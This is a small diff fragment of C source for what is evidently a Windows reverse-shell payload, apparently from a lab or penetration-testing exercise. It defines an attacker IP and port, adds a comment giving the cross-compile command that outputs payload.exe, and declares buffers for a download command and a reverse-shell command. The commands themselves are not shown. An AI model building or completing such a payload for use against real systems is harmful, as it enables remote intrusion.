@@ -4,6 +4,7 @@
 #define ATTACKER_IP "192.168.45.152"
 #define ATTACKER_PORT "443"
 
+// Note: Compile with x86_64-w64-mingw32-gcc shell.c -o payload.exe
 int main(void) {
     char downloadCmd[512];
     char reverseShellCmd[512];
